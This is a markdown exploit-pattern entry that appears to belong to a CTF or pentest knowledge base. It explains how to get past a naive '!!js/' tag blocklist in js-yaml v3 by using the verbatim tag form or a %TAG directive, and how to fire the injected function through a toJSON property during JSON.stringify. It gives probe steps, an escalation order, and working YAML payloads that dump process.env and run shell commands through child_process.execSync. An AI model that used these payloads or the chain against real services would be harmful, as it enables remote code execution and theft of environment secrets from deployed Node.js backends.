---
doc_kind: pattern
title: "js-yaml v3 Tag Blocklist Bypass via Verbatim Tag + toJSON RCE Trigger"
category: web
slug: jsyaml-v3-verbatim-tag-tojson-rce
created: 2026-10-25
status: active
tags:
  - js-yaml
  - yaml
  - deserialization
  - tojson
  - json-stringify
  - tag-bypass
  - rce
chain_summary: "Bypass a naive !!js/ string blocklist on js-yaml v3 (unsafe schema) using the verbatim tag form !<tag:yaml.org,2002:js/function>, then trigger execution with no explicit call site by giving an object a toJSON function property that JSON.stringify() invokes during serialization."
---
# js-yaml v3 Tag Blocklist Bypass via Verbatim Tag + toJSON RCE Trigger

## Chain Summary

- One-line chain: Bypass a naive !!js/ string blocklist on js-yaml v3 (unsafe schema) using the verbatim tag form !<tag:yaml.org,2002:js/function>, then trigger execution with no explicit call site by giving an object a toJSON function property that JSON.stringify() invokes during serialization.
- Typical target shape: a Node.js backend (often an internal microservice reached only through a gateway) that calls `yaml.load(userControlledText)` using js-yaml v3 (default/unsafe schema, as opposed to `safeLoad` or the js-yaml v4 default), then serializes the parsed result with `JSON.stringify(...)` for the HTTP response — frequently with a custom blocklist added by the challenge/app author to reject the obvious `!!js/function` tag string.

## Preconditions

- The service uses js-yaml **v3** (or any YAML library whose default loader constructs native-language objects from tagged scalars — e.g. `!!js/function`, `!!js/regexp`, `!!python/object` in PyYAML's unsafe loader) rather than a safe-by-default loader.
- The parsed YAML result is eventually passed to `JSON.stringify()` (or an equivalent serializer that invokes `toJSON()`/`__toString__`-style hooks) somewhere in the response pipeline — not necessarily immediately after parsing.
- A naive, string-based blocklist (e.g. checking for the literal substring `!!js/`) is the only defense against the dangerous tags, rather than switching to the library's actual `safeLoad`/`FAILSAFE_SCHEMA`.

## Cheap Probes

- Send a YAML scalar/mapping and observe whether the response is a byte-for-byte JSON echo of the input (`JSON.stringify(yaml.load(input))`) — confirms the parse→serialize pipeline shape.
- Send an empty document; `undefined` in the response (rather than `null`/`{}`/an error) confirms `JSON.stringify` is the output mechanism (since `JSON.stringify(undefined) === undefined`).
- Send a self-referencing/cyclic YAML anchor (`&a {x: *a}`); a generic `500`/`502`-class error (rather than a structured validation error) confirms `JSON.stringify` is throwing on a circular structure — further confirmation of the serialization-based pipeline, and a clue that the "rendering" feature is actually just a parse+reserialize round trip, not a template engine.
- Send a YAML document with the literal tag `!!js/function "function(){}"`; a distinct, custom-looking rejection message (e.g. `"rejected: disallowed tag"`) rather than a generic parse error confirms both that the unsafe schema is active and that a blocklist has been bolted on.

## Telltale Evidence

- A service whose "render"/"template" feature never actually substitutes any placeholder or template syntax, no matter what shape of input is tried, while still returning *something* derived from the input — strongly suggests the service is a pure parser/serializer, not a template engine, and the exploitation angle should shift to deserialization gadgets rather than template injection syntax.
- Distinct error messages for parse failure vs. "disallowed tag" vs. generic internal error map directly to distinct code branches and are worth enumerating exhaustively before giving up on a given input shape.

## Escalation Order

1. Confirm the `yaml.load` → `JSON.stringify` pipeline shape via the cheap probes above.
2. Confirm the unsafe schema is active and a tag blocklist exists by sending the literal `!!js/function` tag and observing the custom rejection.
3. Bypass the blocklist using the **verbatim tag URI form**: `!<tag:yaml.org,2002:js/function> "function(){ ... }"` (equivalently, a custom `%TAG !e! tag:yaml.org,2002:js/` directive followed by `!e!function "..."`) — any filter matching only the literal string `!!js/` will not recognize either form.
4. Confirm the tag resolves (locally, against the same js-yaml version if possible) by constructing a harmless function and checking it parses without rejection.
5. Trigger execution with no explicit call site by assigning the constructed function as an object's `toJSON` property: `{"a": {"toJSON": <constructed function>}}`. `JSON.stringify()` calls `.toJSON()` on any object that has one as part of normal serialization — this fires the function during the service's own output-formatting step.
6. Start with a low-impact payload (`return JSON.stringify(process.env)`) to confirm execution and env-var exfiltration before escalating to `child_process` (note: a function constructed via `new Function(...)` has no `require` in scope — use `process.mainModule.require('child_process')` instead for full command execution in a Node CJS context).

## Common Mistakes

- Spending excessive time guessing at "template" field names/placeholder syntaxes (`template`, `data`, `name`, `{{...}}`, `<%= %>`) when the service's own differentiated error messages already indicate a parse/serialize pipeline rather than a template engine — re-derive the model from observed error behavior instead of the feature's surface name (e.g. "render-report").
- Testing only the exact literal `!!js/function` tag string and concluding the unsafe schema isn't exploitable once it's rejected, without trying the verbatim tag form or a `%TAG` directive.
- Assuming a constructed function needs an explicit call site in the payload — overlooking `toJSON` (or other implicit-invocation hooks like `valueOf`/`Symbol.toPrimitive` depending on the sink) as a zero-click trigger during serialization.

## Payload Shapes

```yaml
# Env-var exfiltration via toJSON trigger during JSON.stringify
a:
  toJSON: !<tag:yaml.org,2002:js/function> "function(){ return JSON.stringify(process.env) }"
```

```yaml
# Full RCE via child_process (note: process.mainModule.require, not bare require)
a:
  toJSON: !<tag:yaml.org,2002:js/function> "function(){ try { var cp=process.mainModule.require('child_process'); return cp.execSync('id', {encoding:'utf8'}); } catch(e){ return 'ERR='+e.message } }"
```

```yaml
# Alternative tag-blocklist bypass via a custom %TAG directive
%TAG !e! tag:yaml.org,2002:js/
---
a:
  toJSON: !e!function "function(){ return JSON.stringify(process.env) }"
```

## Related Writeups

- `knowledge/writeups/web/clearhouse-graphql-idor-traversal-jsyaml-tojson-rce.md`

## Skill Impact

- Related skill: `web-triage` (deserialization branch)
- Rule to add or update: when a user-controlled YAML/serialization input is echoed back (even partially, or only on error), check whether the output path is `JSON.stringify` (telltale: `undefined` for empty input, generic error on circular structures) before assuming a template-injection surface; if js-yaml v3 (or similarly unsafe-by-default YAML libs) is in play with a string-based tag blocklist, try the verbatim tag form and a `toJSON`-based zero-click trigger.
